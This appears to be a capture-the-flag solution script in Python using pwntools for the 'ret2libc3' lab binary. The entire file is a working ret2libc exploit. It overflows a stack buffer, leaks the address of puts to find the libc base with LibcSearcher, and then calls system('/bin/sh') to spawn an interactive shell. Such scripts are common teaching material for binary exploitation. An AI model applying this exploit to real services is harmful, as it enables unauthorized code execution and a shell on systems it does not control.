from pwn import *
from LibcSearcher import LibcSearcher
context(arch="i386", os="linux", log_level="debug")

p = process('./ret2libc3')
e = ELF("./ret2libc3")

puts_plt_addr = e.plt["puts"]
puts_got_addr = e.got["puts"]
start_addr = e.symbols["_start"]
offset =112

payload1 = offset*'a' + p32(puts_plt_addr) + p32(start_addr) + p32(puts_got_addr)
p.sendafter("Can you find it !?", payload1)
puts_addr = u32(p.recv()[0:4])

libc = LibcSearcher("puts", puts_addr)
base_addr = puts_addr - libc.dump("puts")

system_addr = base_addr + libc.dump("system")
bin_sh_addr = base_addr + libc.dump("str_bin_sh")

payload2 = offset*'a' + p32(system_addr) + p32(1) + p32(bin_sh_addr)
p.sendline(payload2)
p.interactive()